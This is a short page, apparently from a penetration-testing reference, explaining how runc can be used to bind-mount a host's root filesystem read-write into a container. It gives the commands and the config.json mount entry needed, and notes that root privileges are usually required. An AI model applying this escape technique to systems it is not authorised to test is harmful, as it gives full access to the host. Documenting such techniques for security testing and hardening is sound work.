# runc

`runc` is a lightweight, portable container runtime that manages the lifecycle of containers according to the Open Container Initiative (OCI) specifications. It is commonly used as the underlying runtime for container platforms like Docker.

If `runc` is installed on a host, it may be possible to create and run a container that mounts the host’s root filesystem (`/`), potentially allowing access to the entire host.

```bash
# Verify the runc is installed
runc --help

# Generate a container configuration file
runc spec
```

This creates a `config.json` file in the current directory. Inside this file, locate the `"mounts"` section and add the following entry to bind mount the host’s root directory into the container:

```json
{
    "type": "bind",
    "source": "/",
    "destination": "/",
    "options": [
        "rbind",
        "rw",
        "rprivate"
    ]
}
```

Next, create a `rootfs` folder in the same directory:

```bash
# Create the rootfs folder in the same directory
mkdir rootfs

# Start the container
runc run demo
```

This runs a container with access to the host’s root filesystem. Note that this technique may not always succeed because **`runc` typically requires `root` privileges to run containers**. Running `runc` as an unprivileged user generally fails unless a rootless configuration is in place. Rootless containers impose additional restrictions compared to traditional root-run containers, which is why rootless mode is not the default.
